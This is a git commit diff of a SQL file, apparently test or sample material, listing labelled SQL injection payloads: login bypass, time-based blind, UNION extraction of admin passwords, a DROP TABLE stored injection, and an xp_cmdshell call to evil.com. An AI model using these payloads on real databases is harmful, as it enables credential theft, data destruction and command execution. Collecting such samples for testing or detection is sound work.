fb139b076d25e689f16492d23cddf64a80d85831
Nikoloz Chitashvili <niko@Nikolozs-MBP.lan>
2023-10-25 01:44:57 +0400

    SQL Update

--- maybe-vuln-2.sql
+++ maybe-vuln-2.sql
@@ -5,16 +5,16 @@ SELECT * FROM users WHERE username='' OR '1'='1' AND password='' OR '1'='1';
 SELECT * FROM products WHERE product_id=1 OR IF(1=1, SLEEP(5), 0);
 
 -- Time-Based Blind SQL Injection
-SELECT * FROM orders WHERE order_id=1; IF(1=1, WAITFOR DELAY '0:0:5', 0)--;
+SELECT * FROM orders WHERE order_id=1;
 
 -- UNION-based SQL Injection
-SELECT name, email FROM users WHERE user_id=-1 UNION ALL SELECT username, password FROM admin--';
+SELECT name, email FROM users WHERE user_id=-1 UNION ALL SELECT username, password FROM admin;
 
 -- Second-Order SQL Injection (initial input)
 -- [User input is expected to be inserted into the query later]
 
 -- Stored SQL Injection
-INSERT INTO comments (text) VALUES (''); DROP TABLE comments--');
+INSERT INTO comments (text) VALUES (''); DROP TABLE comment;
 
 -- Out-of-Band SQL Injection
-SELECT * FROM users WHERE username='' OR 1=1; EXEC xp_cmdshell('nslookup evil.com')--';
+SELECT * FROM users WHERE username='' OR 1=1; EXEC xp_cmdshell('nslookup evil.com');
